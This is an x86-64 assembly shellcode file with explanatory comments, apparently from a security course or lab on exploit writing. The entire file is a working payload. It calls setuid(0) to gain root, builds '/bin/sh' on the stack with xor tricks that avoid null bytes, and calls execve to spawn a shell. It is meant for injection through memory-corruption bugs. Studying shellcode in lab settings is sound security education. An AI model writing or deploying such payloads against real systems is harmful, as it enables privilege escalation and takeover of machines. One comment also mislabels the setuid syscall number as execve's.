# This shellcode should first elevate the current process to root, then
# write "/bin/sh" (or it's equivalent) to memory, get its address, and
# invoke a "execve" syscall to spawn a shell.

.global shellcode
shellcode:
	# In order to get root privilege, we should call setuid(0) first.
	# According to Linux header's /arch/x86/include/generated/uapi/asm/unistd_64.h,
	# the id of execve syscall is __NR_setuid = 105
	## movq $105, %rax
	xorq %rax, %rax
	movb $105, %al

	# int setuid (uid_t uid);
	xorq %rdi, %rdi # Pass argument1 with rdi

	# Invoke a setuid syscall
	syscall
	
	# Now this process is running under root, so we should spawn a shell now.
	# We can use execve syscall to spawn /bin/sh, but first we should put the string
	# '/bin/sh' to memory.
	# The easiest way to put a string to memory is pushing it to the stack.
	# But the following instruction contain a '\0', which can't be passed inside a string.
	# movq $0x0068732f6e69622f, %rax # Reverse of "/bin/sh\0" since it's little endian
	# We can use xor to produce zeros.
	movq $0x2f62696e2f7368ff, %rax # "/bin/sh\xFF"
	xorb %al, %al
	bswap %rax # Reverse byte order since it's little endian
	pushq %rax

	# According to Linux header's /arch/x86/include/generated/uapi/asm/unistd_64.h,
	# the id of execve syscall is __NR_execve = 59
	## movq $59, %rax
	xorq %rax, %rax
	movb $59, %al

	# int execve (const char *filename, char *const argv [], char *const envp[]);
	movq %rsp, %rdi # Pass argument1 with rdi

	# argv[0] should be filename, and argv[] must end with a NULL, su argv[1] = NULL
	# Construct argv[] also on the stack.
	# The later-pushed value's address is smaller, so push NULL before push filename.
	xorq %rbx, %rbx
	pushq %rbx # pushq $0
	pushq %rdi
	movq %rsp, %rsi # Pass argument2 with rsi

	# envp = NULL
	xorq %rdx, %rdx # Pass argument3 with rdx

	# Invoke a execve syscall
	syscall
